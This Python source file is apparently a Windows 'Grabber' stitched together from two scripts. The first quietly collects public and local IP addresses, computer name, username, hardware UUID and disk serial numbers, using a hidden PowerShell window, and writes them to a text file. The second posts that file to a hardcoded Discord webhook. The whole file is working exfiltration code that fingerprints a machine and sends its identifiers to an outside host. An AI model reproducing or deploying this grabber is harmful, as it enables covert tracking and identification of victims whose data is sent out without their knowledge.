import ctypes
import json
from ctypes import wintypes
import os
import platform
import queue
import threading
from datetime import datetime
from pathlib import Path
import shutil
import socket
import subprocess
import sys
import tkinter as tk
from tkinter import messagebox, ttk
import tempfile
import urllib.request
import winreg

URL = "https://api.ipify.org"
NOTE_PATH = Path("C:/Downloads/windowinfo.txt")

BROWSER_EXES = {
    "Microsoft Edge": "msedge.exe",
    "Google Chrome": "chrome.exe",
    "Mozilla Firefox": "firefox.exe",
    "Brave": "brave.exe",
    "Opera": "opera.exe",
    "Vivaldi": "vivaldi.exe",
}
BROWSER_PROGID_HINTS = {
    "Microsoft Edge": ("microsoftedge", "msedge"),
    "Google Chrome": ("chromehtml",),
    "Mozilla Firefox": ("firefoxurl", "firefoxhtml"),
    "Brave": ("bravehtml", "brave"),
    "Opera": ("operastable", "opera"),
    "Vivaldi": ("vivaldihtm", "vivaldi"),
}


class MEMORYSTATUSEX(ctypes.Structure):
    _fields_ = [
        ("dwLength", ctypes.c_ulong),
        ("dwMemoryLoad", ctypes.c_ulong),
        ("ullTotalPhys", ctypes.c_ulonglong),
        ("ullAvailPhys", ctypes.c_ulonglong),
        ("ullTotalPageFile", ctypes.c_ulonglong),
        ("ullAvailPageFile", ctypes.c_ulonglong),
        ("ullTotalVirtual", ctypes.c_ulonglong),
        ("ullAvailVirtual", ctypes.c_ulonglong),
        ("ullAvailExtendedVirtual", ctypes.c_ulonglong),
    ]


class VS_FIXEDFILEINFO(ctypes.Structure):
    _fields_ = [
        ("dwSignature", ctypes.c_uint32),
        ("dwStrucVersion", ctypes.c_uint32),
        ("dwFileVersionMS", ctypes.c_uint32),
        ("dwFileVersionLS", ctypes.c_uint32),
        ("dwProductVersionMS", ctypes.c_uint32),
        ("dwProductVersionLS", ctypes.c_uint32),
        ("dwFileFlagsMask", ctypes.c_uint32),
        ("dwFileFlags", ctypes.c_uint32),
        ("dwFileOS", ctypes.c_uint32),
        ("dwFileType", ctypes.c_uint32),
        ("dwFileSubtype", ctypes.c_uint32),
        ("dwFileDateMS", ctypes.c_uint32),
        ("dwFileDateLS", ctypes.c_uint32),
    ]


def get_registry_value(root, key_path, value_name=None):
    try:
        with winreg.OpenKey(root, key_path) as key:
            return winreg.QueryValueEx(key, value_name)[0]
    except OSError:
        return None


def get_operating_system():
    product_name = platform.system() + " " + platform.release()
    product_name = get_registry_value(
        winreg.HKEY_LOCAL_MACHINE,
        r"SOFTWARE\Microsoft\Windows NT\CurrentVersion",
        "ProductName",
    ) or product_name

    build = sys.getwindowsversion().build
    if product_name.startswith("Windows 10") and build >= 22000:
        product_name = product_name.replace("Windows 10", "Windows 11", 1)
    architecture = "x64" if sys.maxsize > 2**32 else "x86"
    return f"{product_name} (build {build}, {architecture})"


def find_browser_executable(executable):
    app_paths_key = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\" + executable
    registry_views = [0]
    if hasattr(winreg, "KEY_WOW64_64KEY"):
        registry_views.extend([winreg.KEY_WOW64_64KEY, winreg.KEY_WOW64_32KEY])

    for root in (winreg.HKEY_CURRENT_USER, winreg.HKEY_LOCAL_MACHINE):
        for view in registry_views:
            try:
                with winreg.OpenKey(
                    root,
                    app_paths_key,
                    0,
                    winreg.KEY_READ | view,
                ) as key:
                    value = winreg.QueryValueEx(key, None)[0]
                    path = Path(value.strip('"'))
                    if path.is_file():
                        return path
            except OSError:
                pass
    return None


def get_file_version(path):
    try:
        version_api = ctypes.WinDLL("version", use_last_error=True)
        version_api.GetFileVersionInfoSizeW.argtypes = [
            wintypes.LPCWSTR,
            ctypes.POINTER(wintypes.DWORD),
        ]
        version_api.GetFileVersionInfoSizeW.restype = wintypes.DWORD
        version_api.GetFileVersionInfoW.argtypes = [
            wintypes.LPCWSTR,
            wintypes.DWORD,
            wintypes.DWORD,
            wintypes.LPVOID,
        ]
        version_api.GetFileVersionInfoW.restype = wintypes.BOOL
        version_api.VerQueryValueW.argtypes = [
            wintypes.LPCVOID,
            wintypes.LPCWSTR,
            ctypes.POINTER(ctypes.c_void_p),
            ctypes.POINTER(wintypes.UINT),
        ]
        version_api.VerQueryValueW.restype = wintypes.BOOL

        ignored = wintypes.DWORD(0)
        size = version_api.GetFileVersionInfoSizeW(str(path), ctypes.byref(ignored))
        if not size:
            return None

        data = ctypes.create_string_buffer(size)
        if not version_api.GetFileVersionInfoW(str(path), 0, size, data):
            return None

        value_pointer = ctypes.c_void_p()
        value_length = wintypes.UINT(0)
        if not version_api.VerQueryValueW(
            data,
            "\\",
            ctypes.byref(value_pointer),
            ctypes.byref(value_length),
        ):
            return None

        info = ctypes.cast(
            value_pointer,
            ctypes.POINTER(VS_FIXEDFILEINFO),
        ).contents
        major = info.dwFileVersionMS >> 16
        minor = info.dwFileVersionMS & 0xFFFF
        build = info.dwFileVersionLS >> 16
        revision = info.dwFileVersionLS & 0xFFFF
        return f"{major}.{minor}.{build}.{revision}"
    except (AttributeError, OSError, ValueError):
        return None

def get_installed_browsers():
    browsers = []
    for name, executable in BROWSER_EXES.items():
        path = find_browser_executable(executable)
        if path:
            version = get_file_version(path)
            browsers.append(f"{name} {version}" if version else f"{name} (version unavailable)")
    return browsers


def get_default_browser():
    prog_id = get_registry_value(
        winreg.HKEY_CURRENT_USER,
        r"Software\Microsoft\Windows\Shell\Associations\UrlAssociations\https\UserChoice",
        "ProgId",
    )
    if not prog_id:
        return "Not detected"

    normalized_prog_id = prog_id.lower()
    for name, hints in BROWSER_PROGID_HINTS.items():
        if any(hint in normalized_prog_id for hint in hints):
            path = find_browser_executable(BROWSER_EXES[name])
            version = get_file_version(path) if path else None
            return f"{name} {version}" if version else f"{name} (version unavailable)"
    return f"Unknown ({prog_id})"


def get_local_ip():
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as connection:
            connection.connect(("1.1.1.1", 80))
            return connection.getsockname()[0]
    except OSError:
        try:
            addresses = socket.getaddrinfo(socket.gethostname(), None, socket.AF_INET)
            for address in addresses:
                ip_address = address[4][0]
                if not ip_address.startswith("127."):
                    return ip_address
        except OSError:
            pass
    return "Not detected"


def get_cpu_name():
    cpu_name = get_registry_value(
        winreg.HKEY_LOCAL_MACHINE,
        r"HARDWARE\DESCRIPTION\System\CentralProcessor\0",
        "ProcessorNameString",
    )
    return cpu_name.strip() if cpu_name else (platform.processor() or "Not detected")


def get_installed_ram():
    memory = MEMORYSTATUSEX()
    memory.dwLength = ctypes.sizeof(MEMORYSTATUSEX)
    global_memory_status_ex = ctypes.windll.kernel32.GlobalMemoryStatusEx
    global_memory_status_ex.argtypes = [ctypes.POINTER(MEMORYSTATUSEX)]
    global_memory_status_ex.restype = wintypes.BOOL
    if not global_memory_status_ex(ctypes.byref(memory)):
        return "Not detected"
    gib = memory.ullTotalPhys / (1024 ** 3)
    return f"{gib:.1f} GB"


def get_free_disk_space():
    drive = Path.home().anchor or "C:\\"
    free_bytes = shutil.disk_usage(drive).free
    gib = free_bytes / (1024 ** 3)
    return f"{gib:.1f} GB free on {drive}"


def get_hardware_identifiers():
    powershell_command = (
        "$ErrorActionPreference='Stop'; "
        "$computer = Get-CimInstance -ClassName Win32_ComputerSystemProduct; "
        "$disks = @(Get-CimInstance -ClassName Win32_DiskDrive | "
        "Select-Object Index, Model, SerialNumber, PNPDeviceID); "
        "[PSCustomObject]@{ComputerUUID=$computer.UUID; Disks=$disks} "
        "| ConvertTo-Json -Depth 4 -Compress"
    )
    try:
        result = subprocess.run(
            ["powershell.exe", "-NoProfile", "-Command", powershell_command],
            check=True,
            capture_output=True,
            text=True,
            encoding="utf-8",
            errors="replace",
            timeout=20,
            creationflags=subprocess.CREATE_NO_WINDOW,
        )
        info = json.loads(result.stdout)
        computer_uuid = str(info.get("ComputerUUID") or "Not detected").strip()
        disks = info.get("Disks") or []
        if isinstance(disks, dict):
            disks = [disks]

        drive_ids = []
        for disk in disks:
            parts = []
            model = str(disk.get("Model") or "").strip()
            serial = str(disk.get("SerialNumber") or "").strip()
            device_id = str(disk.get("PNPDeviceID") or "").strip()
            if model:
                parts.append(f"Model: {model}")
            if serial:
                parts.append(f"Serial: {serial}")
            if device_id:
                parts.append(f"Device ID: {device_id}")
            if parts:
                drive_ids.append(f"Disk {disk.get('Index', '?')}: " + " | ".join(parts))

        return computer_uuid, drive_ids
    except (OSError, subprocess.SubprocessError, json.JSONDecodeError, AttributeError):
        return "Not detected", []

def main():
    with urllib.request.urlopen(URL, timeout=10) as response:
        public_ip = response.read().decode("utf-8").strip()

    computer_hwid, drive_hwids = get_hardware_identifiers()
    browsers = get_installed_browsers()
    browser_text = ", ".join(browsers) if browsers else "None detected"
    sections = [
        f"Date/Time: {datetime.now().astimezone().strftime('%Y-%m-%d %H:%M:%S %Z')}",
        f"Operating System: {get_operating_system()}",
        f"Public IP Address: {public_ip}",
        f"Local IP Address: {get_local_ip()}",
        f"Computer Name: {socket.gethostname()}",
        f"CMD Username: {os.environ.get('USERNAME', 'Not detected')}",
        f"Computer Hardware UUID: {computer_hwid}",
        "Physical Drive HWIDs:\n" + ("\n".join(drive_hwids) if drive_hwids else "Not detected"),
        f"Default Browser: {get_default_browser()}",
        f"Installed Browsers: {browser_text}",
        f"CPU: {get_cpu_name()}",
        f"Installed RAM: {get_installed_ram()}",
        f"Available Disk Space: {get_free_disk_space()}",
    ]
    NOTE_PATH.parent.mkdir(parents=True, exist_ok=True)
    NOTE_PATH.write_text("\n\n".join(sections) + "\n", encoding="utf-8")

    escaped_path = str(NOTE_PATH).replace("'", "''")
    powershell_command = f"Set-Clipboard -Path '{escaped_path}'"
    subprocess.run(
        ["powershell.exe", "-NoProfile", "-Command", powershell_command],
        check=True,
        creationflags=subprocess.CREATE_NO_WINDOW,
    )



def show_error(message):
    message_box = ctypes.windll.user32.MessageBoxW
    message_box.argtypes = [
        wintypes.HWND,
        wintypes.LPCWSTR,
        wintypes.LPCWSTR,
        wintypes.UINT,
    ]
    message_box.restype = ctypes.c_int
    message_box(
        None,
        f"Grabber could not finish:\n\n{message}",
        "Grabber",
        0x10,
    )

import json
from pathlib import Path
import urllib.error
import urllib.request

WEBHOOK_URL = "https://discord.com/api/webhooks/1552856673872515082/pZAU6LAs9GT8QqXDwxEAjdG22KZX6MEei-qxe6QzPZYIXvnLXf852b8U2h3L6KYa7Rx0"
FILE_TO_SEND = Path(r"C:\Downloads\windowinfo.txt")
CHUNK_SIZE = 1900


def _chunks(text: str, size: int = CHUNK_SIZE):
    while len(text) > size:
        cut = text.rfind("\n", 0, size + 1)
        if cut < size // 2:
            cut = size
        yield text[:cut]
        text = text[cut:].lstrip("\n")
    if text:
        yield text


def send_file_to_discord(webhook_url: str = WEBHOOK_URL) -> int:
    """Send the contents of FILE_TO_SEND to Discord."""
    if not webhook_url or webhook_url == "PASTE_YOUR_DISCORD_WEBHOOK_URL_HERE":
        raise RuntimeError("Paste your Discord webhook URL into WEBHOOK_URL first.")
    if not FILE_TO_SEND.is_file():
        raise RuntimeError(f"File not found: {FILE_TO_SEND}")

    try:
        text = FILE_TO_SEND.read_text(encoding="utf-8-sig", errors="replace")
    except OSError as exc:
        raise RuntimeError(f"Could not read {FILE_TO_SEND}: {exc}") from exc
    if not text.strip():
        raise RuntimeError(f"File is empty: {FILE_TO_SEND}")

    sent = 0
    for part in _chunks(text):
        body = json.dumps({
            "content": part,
            "allowed_mentions": {"parse": []},
        }).encode("utf-8")
        request = urllib.request.Request(
            webhook_url,
            data=body,
            headers={"Content-Type": "application/json", "User-Agent": "file-webhook/1.0"},
            method="POST",
        )
        try:
            with urllib.request.urlopen(request, timeout=15) as response:
                if not 200 <= response.status < 300:
                    raise RuntimeError(f"Discord returned HTTP {response.status}.")
        except urllib.error.HTTPError as exc:
            detail = exc.read().decode("utf-8", errors="replace")
            raise RuntimeError(f"Discord returned HTTP {exc.code}: {detail}") from exc
        except urllib.error.URLError as exc:
            raise RuntimeError(f"Could not reach Discord: {exc.reason}") from exc
        sent += 1

    return sent


if __name__ == "__main__":
    try:
        count = send_file_to_discord()
        print(f"Sent file contents in {count} Discord message(s).")
    except RuntimeError as exc:
        raise SystemExit(str(exc))
